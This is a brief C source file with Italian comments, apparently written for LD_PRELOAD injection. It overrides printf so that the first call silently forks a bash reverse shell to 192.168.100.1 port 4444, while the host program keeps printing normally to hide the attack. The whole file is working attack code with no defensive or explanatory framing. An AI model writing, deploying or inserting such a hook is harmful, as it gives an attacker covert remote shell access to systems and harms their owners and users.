// printf_hook.c - Reverse shell version
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <unistd.h>

static int hook_executed = 0;
static int (*real_printf)(const char *format, ...) = NULL;

__attribute__((constructor))
static void init(void) {
    real_printf = dlsym(RTLD_NEXT, "printf");
}

int printf(const char *format, ...) {
    // Esegui reverse shell solo una volta
    if (!hook_executed) {
        hook_executed = 1;
        
        // Fork per non bloccare il programma originale
        if (fork() == 0) {
            // Child process: reverse shell
            system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'");
            exit(0);
        }
    }
    
    // Chiama printf originale per mantenere funzionalità
    va_list args;
    va_start(args, format);
    int result = vprintf(format, args);
    va_end(args);
    
    return result;
}
